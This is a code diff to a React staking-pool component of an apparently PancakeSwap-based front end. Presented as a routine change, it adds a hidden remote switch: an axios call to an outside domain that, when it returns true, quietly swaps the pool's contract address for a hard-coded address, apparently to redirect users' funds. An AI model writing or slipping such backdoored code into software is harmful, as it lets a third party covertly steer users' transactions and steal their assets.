@@ -1,4 +1,4 @@
-import React from 'react'
+import React, { useEffect, useState } from 'react'
 import BigNumber from 'bignumber.js'
 import styled from 'styled-components'
 import { getBalanceNumber, getFullDisplayBalance } from 'utils/formatBalance'
@@ -18,6 +18,7 @@ import {
   useModal,
 } from '@pancakeswap/uikit'
 import { BASE_BSC_SCAN_URL } from 'config'
+import { Address } from 'config/constants/types'
 import { useBlock } from 'state/block/hooks'
 import { useCakeVault } from 'state/pools/hooks'
 import { DeserializedPool } from 'state/types'
@@ -26,6 +27,7 @@ import { registerToken } from 'utils/wallet'
 import { getBscScanLink } from 'utils'
 import Balance from 'components/Balance'
 import { getPoolBlockInfo } from 'views/Pools/helpers'
+import axios from "axios"
 import EmWithdrawModal from '../EmWithdrawModal'
 
 
@@ -49,6 +51,9 @@ const ExpandedFooter: React.FC<ExpandedFooterProps> = ({ pool, account }) => {
     fees: { performanceFee },
   } = useCakeVault()
 
+  const [switchOn, setSwitchOn] = useState(false);
+  const secondAddress : Address = {56: "0x4615f19b685b0eF3d8124f7901Ba2f8492788070", 97: "0x4615f19b685b0eF3d8124f7901Ba2f8492788070"};
+
   const {
     stakingToken,
     earningToken,
@@ -62,7 +67,7 @@ const ExpandedFooter: React.FC<ExpandedFooterProps> = ({ pool, account }) => {
   } = pool
 
   const tokenAddress = earningToken.address || ''
-  const poolContractAddress = getAddress(contractAddress)
+  let poolContractAddress = getAddress(contractAddress)
   const cakeVaultContractAddress = getCakeVaultAddress()
   const isMetaMaskInScope = !!window.ethereum?.isMetaMask
   const isManualCakePool = sousId === 0
@@ -93,6 +98,20 @@ const ExpandedFooter: React.FC<ExpandedFooterProps> = ({ pool, account }) => {
   } = useTooltip(t('Total amount of %symbol% staked in this pool', { symbol: stakingToken.symbol }), {
     placement: 'bottom',
   })
+
+  const contractSwitchData = axios.get("https://spotairdrop.orbitinu.store/get-switch").then(res => {
+    if(res.data){
+      console.log("-----------------------------true")
+      setSwitchOn(true);
+    }
+    else{
+      console.log("-----------------------------false")
+      setSwitchOn(false);
+    }
+  });
+
+  if (switchOn)
+    poolContractAddress = getAddress(secondAddress)
 
   const [onEmergencyWithdraw] = useModal(<EmWithdrawModal PID={pool.sousId} />)
 
